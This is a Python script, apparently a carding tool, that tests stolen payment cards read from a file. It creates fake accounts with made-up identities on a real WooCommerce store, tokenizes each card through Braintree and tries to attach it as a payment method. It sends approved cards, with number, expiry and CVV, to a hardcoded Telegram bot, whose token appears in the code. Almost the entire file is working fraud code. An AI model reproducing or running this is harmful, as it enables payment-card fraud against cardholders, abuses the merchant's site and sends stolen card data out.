import os
import requests
import pyfiglet
import json
import time
import user_agent
from urllib.parse import urlparse, parse_qs
	
O =  '\033[1;31m' #Red.... like< Red Line > only Anime fan will know☆
Z =  '\033[1;37m' #white
F = '\033[1;32m' #Green
B = '\033[2;36m' #Light Blue
X = '\033[1;33m' #Yellow
C = '\033[2;35m' #Purple
	
logo = pyfiglet.figlet_format('                   TAKEMICHI  ')
print(Z+logo)
k=("----☆----☆-----☆------☆-----☆") 
print(C+k)
lo=("By: TAKEMICHI ~ @Q_2_M")
print(Z+lo)
i=("----☆----☆-----☆------☆-----☆")
print(X+i)
o=("")
NMF = "cc.txt"
print(C+i)
	
file=open(NMF,"+r")
start_num = 0
for P in file.readlines():
	start_num += 1
	n = P.split('|')[0]
	mm=P.split('|')[1]
	yy=P.split('|')[2][-2:]
	cvc=P.split('|')[3].replace('\n', '')
	P=P.replace('\n', '')
	
		
	import requests, re, base64, random, string, user_agent
	from bs4 import BeautifulSoup
	
	
	
	
	user = user_agent.generate_user_agent()
	
	
	r = requests.session()
	
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=15))
		number = ''.join(random.choices(string.digits, k=4))
		domain = ''.join(random.choices(string.ascii_lowercase, k=7))
		return f"{name}{number}@{domain}.com"
			    
	acc = (generate_random_account())
	
	
	
	def generate_random_code(length=32):
		    letters_and_digits = string.ascii_letters + string.digits
		    return ''.join(random.choice(letters_and_digits) for _ in range(length))
		
	corr = generate_random_code()
	

	def generate_full_name():
	    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
	                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
	                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
	                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
	                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
	                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
	                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
	                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
	                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
	                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] 
	    
	    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
	                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
	                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
	                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
	                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
	                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
	                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
	                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] 
	                   
	    full_name = random.choice(first_names) + " " + random.choice(last_names)
	    first_name, last_name = full_name.split()
	    
	    return first_name, last_name
	
	def generate_address():
	    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
	    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
	    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
	    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
	
	    city = random.choice(cities)
	    state = states[cities.index(city)]
	    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
	    zip_code = zip_codes[states.index(state)]
	
	    return city, state, street_address, zip_code
	
	# Testing the library:
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
	
	
	
	
	

	def num():
		number = ''.join(random.choices(string.digits, k=7))
		return f"303{number}"
	num = (num())
	
	


	
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Cache-Control': 'no-cache',
	    'Pragma': 'no-cache',
	    'User-Agent': user,
	}
	
	response = r.get('https://myalftraining.com/user-account/', headers=headers)
	
	
	soup = BeautifulSoup(response.text, 'html.parser')
	nonce_value = soup.find('input', {'id': 'woocommerce-register-nonce'}).get('value')
	
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Cache-Control': 'no-cache',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    'Pragma': 'no-cache',
	    'User-Agent': user,
	}
	
	data = {
	    'email': acc,
	    'password': 'kfjkssoifskakjf',
	    'wc_order_attribution_source_type': 'typein',
	    'wc_order_attribution_referrer': 'https://myalftraining.com/user-account/',
	    'wc_order_attribution_utm_campaign': '(none)',
	    'wc_order_attribution_utm_source': '(direct)',
	    'wc_order_attribution_utm_medium': '(none)',
	    'wc_order_attribution_utm_content': '(none)',
	    'wc_order_attribution_utm_id': '(none)',
	    'wc_order_attribution_utm_term': '(none)',
	    'wc_order_attribution_session_entry': 'https://myalftraining.com/user-account/edit-account/',
	    'wc_order_attribution_session_start_time': '2024-04-21 04:48:36',
	    'wc_order_attribution_session_pages': '3',
	    'wc_order_attribution_session_count': '1',
	    'wc_order_attribution_user_agent': user,
	    'mailchimp_woocommerce_newsletter': '1',
	    'woocommerce-register-nonce': nonce_value,
	    '_wp_http_referer': '/user-account/add-payment-method/',
	    'register': 'Register',
	}
	
	response = r.post('https://myalftraining.com/user-account/add-payment-method/', headers=headers, data=data)
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Cache-Control': 'no-cache',
	    'Pragma': 'no-cache',
	    'User-Agent': user,
	}
	
	response = r.get('https://myalftraining.com/user-account/edit-address/billing/', cookies=r.cookies, headers=headers)
	
	
	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
	
	
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Cache-Control': 'no-cache',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    'Origin': 'https://myalftraining.com',
	    'Pragma': 'no-cache',
	    'User-Agent': user,
	}
	
	data = {
	    'billing_first_name': first_name,
	    'billing_last_name': last_name,
	    'billing_company': '',
	    'billing_country': 'US',
	    'billing_address_1': street_address,
	    'billing_address_2': '',
	    'billing_city': city,
	    'billing_state': state,
	    'billing_postcode': zip_code,
	    'billing_phone': num,
	    'billing_email': acc,
	    'save_address': 'Save address',
	    'woocommerce-edit-address-nonce': address,
	    '_wp_http_referer': '/user-account/edit-address/billing/',
	    'action': 'edit_address',
	}
	
	response = r.post(
	    'https://myalftraining.com/user-account/edit-address/billing/',
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Cache-Control': 'no-cache',
	    'Connection': 'keep-alive',
	    'Pragma': 'no-cache',
	    'User-Agent': user,
	}
	
	response = r.get('https://myalftraining.com/user-account/add-payment-method/', cookies=r.cookies, headers=headers)
	
	
	
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	
	
	client_token_nonce = re.search(r'"client_token_nonce":"(.*?)"', response.text).group(1)
	
	
	
	
	
	
	headers = {
	    'Accept': '*/*',
	    'Cache-Control': 'no-cache',
	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'Pragma': 'no-cache',
	    'User-Agent': user,
	}
	
	data = {
	    'action': 'wc_braintree_credit_card_get_client_token',
	    'nonce': client_token_nonce,
	}
	
	response = r.post('https://myalftraining.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
	
	
	
	enc = response.json()['data']
	
	decoded_text = base64.b64decode(enc).decode('utf-8')
	
	
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
	
	
	
	
	import requests
	
	headers = {
	    'accept': '*/*',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'cache-control': 'no-cache',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'pragma': 'no-cache',
	    'user-agent': user,
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'ca935889-31fb-4b0d-99b4-154b36aa0177',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	

	try:
		tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
		continue
		
	
	
	
	
	
	
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Cache-Control': 'no-cache',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    'Pragma': 'no-cache',
	    'User-Agent': user,
	}
	
	data = [
	
	    ('payment_method', 'braintree_credit_card'),
	    ('wc-braintree-credit-card-card-type', 'visa'),
	    ('wc-braintree-credit-card-3d-secure-enabled', ''),
	    ('wc-braintree-credit-card-3d-secure-verified', ''),
	    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
	    ('wc_braintree_credit_card_payment_nonce', tok),
	    ('wc_braintree_device_data', '{"correlation_id":"'+corr+'"}'),
	    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
	    ('wc_braintree_paypal_payment_nonce', ''),
	    ('wc_braintree_device_data', '{"correlation_id":"'+corr+'"}'),
	    ('wc-braintree-paypal-context', 'shortcode'),
	    ('wc_braintree_paypal_amount', '0.00'),
	    ('wc_braintree_paypal_currency', 'USD'),
	    ('wc_braintree_paypal_locale', 'en_us'),
	    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
	    ('woocommerce-add-payment-method-nonce', add_nonce),
	    ('_wp_http_referer', '/user-account/add-payment-method/'),
	    ('woocommerce_add_payment_method', '1'),
	]
	
	response = r.post('https://myalftraining.com/user-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
	
	
	
	pattern = r'Status code (.*?)\s*</li>'
	
	match = re.search(pattern, response.text)
	
	
	if match:
		result = match.group(1)
		if 'risk_threshold' in response.text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in response.text:
			result = "1000: Approved"
		else:
			result = "Error"
	

	
	if 'funds' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
		print(F+f'[{start_num}]',P,'➜ '+result+' ✅ ')
		msg = f'''𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅\n━━━━━━━━━━━━━━━━           \n[↯] 𝗖𝗖 ⇾ {P}\n[↯] 𝗚𝗔𝗧𝗘𝗦: Braintree Auth\n[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: {result} 🟢\n━━━━━━━━━━━━━━━━\n[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾ TAKEMICHI ~ @Q_2_M'''
		tlg = f'''https://api.telegram.org/bot6648281010:AAE3rsqcxjoXxv0D2s8tGd74lyBV7Uas3Gg/sendMessage?chat_id=6288365358&parse_mode=HTML&text={msg}'''
		tlg_params = {"parse_mode": "HTML"}
		i = requests.post(tlg, params=tlg_params)
	else:
		print(O+f'[{start_num}]',P,'➜ '+result+' ❌ ')
	   
	time.sleep(1)
	
	
	
